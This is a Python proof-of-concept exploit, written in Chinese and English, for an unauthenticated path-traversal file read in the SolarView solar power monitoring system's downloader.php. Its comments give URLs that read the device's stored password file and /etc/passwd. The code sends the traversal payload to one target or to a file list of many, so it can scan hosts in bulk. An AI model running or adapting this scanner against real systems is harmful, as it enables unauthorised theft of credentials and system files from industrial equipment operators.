#!/usr/bin/env python
# -*- conding:utf-8 -*-
# 太阳能发电监视系统（SolarView™）
# 未授权任意文件读取漏洞
# 读取Authorization: 密码信息 url:http://ip:port//downloader.php?file=/home/contec/conf/.pass
# 读取/etc/passwd url:http://ip:port/downloader.php?file=/home/contec/conf/../../../../../../etc/passwd

import requests
import argparse
import sys
import urllib3
import threading
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
   _____       _         __      ___                             _     _ _                            __ _ _                           _ _             
  / ____|     | |        \ \    / (_)                           | |   (_| |                          / _(_| |                         | (_)            
 | (___   ___ | | __ _ _ _\ \  / / _  _____      __    __ _ _ __| |__  _| |_ _ __ __ _ _ __ _   _   | |_ _| | ___   _ __ ___  __ _  __| |_ _ __   __ _ 
  \___ \ / _ \| |/ _` | '__\ \/ / | |/ _ \ \ /\ / /   / _` | '__| '_ \| | __| '__/ _` | '__| | | |  |  _| | |/ _ \ | '__/ _ \/ _` |/ _` | | '_ \ / _` |
  ____) | (_) | | (_| | |   \  /  | |  __/\ V  V /   | (_| | |  | |_) | | |_| | | (_| | |  | |_| |  | | | | |  __/ | | |  __| (_| | (_| | | | | | (_| |
 |_____/ \___/|_|\__,_|_|    \/   |_|\___| \_/\_/     \__,_|_|  |_.__/|_|\__|_|  \__,_|_|   \__, |  |_| |_|_|\___| |_|  \___|\__,_|\__,_|_|_| |_|\__, |
                                                                                             __/ |                                                __/ |
                                                                                            |___/                                                |___/ 
                                                                                                                                        Author:sylon
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        color = "red"
        payload = self.url + "/downloader.php?file=/home/contec/conf/../../../../../../etc/passwd"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }
        
        try:
            res = requests.get(url=payload, headers=headers, verify=False, timeout=5)
            if res.status_code == 200 and "root" in res.text:
                cprint(f"[{chr(8730)}] Target system: {self.url} is vulnerable!",color)
            else:
                print(f"[x] Target system: {self.url} is not vulnerable!")
        except Exception as e:
            print(f"[x] Target system: {self.url} 连接错误！")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='SolarView arbitrary file reading')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  Parameter error！\neg1:>>>python3 poc.py -u http://127.0.0.1\neg2:>>>python3 poc.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()